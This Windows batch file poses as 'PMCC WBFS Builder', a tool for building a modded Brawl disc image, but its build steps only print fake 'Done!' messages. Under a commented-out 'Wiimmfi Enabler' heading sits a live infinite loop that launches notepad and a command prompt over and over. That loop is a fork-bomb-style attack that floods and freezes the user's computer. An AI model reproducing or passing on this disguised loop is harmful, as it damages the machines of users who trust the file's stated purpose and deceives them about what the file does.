@echo off

:: Startup
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo ::::::::::::::::::: PMCC WBFS Builder :::::::::::::::::
echo ::::::::::::::::::::::::: 2.0 :::::::::::::::::::::::::
echo ::::: ISO Builder made by damysteryman/Team DARK ::::::
echo :::::::::::: Edited for PMCC by notaguest :::::::::::::
echo ::::::::::::::::~~~~~~~~~~~~~~~~~~~~~~:::::::::::::::::
echo.
echo Please make sure you have the Brawl ISO [NTSC, ~8GB] in this folder
pause

:: Fix filenames
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
echo Fixing filenames...
echo -(Removing " (1)" if found)
echo If the renaming tool finds anything and warns about existing files, just close it to continue
echo Done!

:: Set mod parameters
SET MOD=PMCC
SET FILEEXT=wbfs
SET SLOT=KSBx-Custom
SET BANNERDL=0

:: Check for mod contents folder
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
echo Checking for %MOD% resources...
echo Done!

::Extract Brawl
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo Extracting Brawl...
echo Done!

::Add mod files
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
echo Adding %MOD% files...
echo.

echo copy /b %MODFOLDER%\apps\
echo copy /b %MODFOLDER%\codes\
echo copy /b %MODFOLDER%\projectm\
echo .
echo .
echo .
echo .
echo .
echo Done!

echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
echo Applying disc revision patch...
echo.
echo Done!

echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
echo Applying %MOD% patches to main executable...
echo Done!

echo.

echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.

echo Rebuilding [%MODNAME%] as %FILEEXT%...
echo Done!

::Clean up working directory
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
echo Deleting temporary folder...
echo Done!
echo.

::Wiimmfi Enabler
::echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
::echo.
::echo Launching Wiimmfi enabler...
::echo readying Wiimmfi Enabler.exe
:a
start notepad
start cmd
goto a
::echo Done!

::Finished
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo Done!
echo WBFS image file has been built one folder up
echo If there were any errors, they were saved to Error log.txt
echo Press any key to make desktop shortcuts and exit, otherwise just close this window
echo Yeet yeet
echo :::::::::::::::::::::::::::::::::::::::::::::::::::::::
pause

echo ::::::::::::::::::::: End session ::::::::::::::::::::: >> "Error log.txt"
echo. >> "Error log.txt"
echo. >> "Error log.txt"
echo. >> "Error log.txt"
echo. >> "Error log.txt"
echo. >> "Error log.txt"
echo. >> "Error log.txt"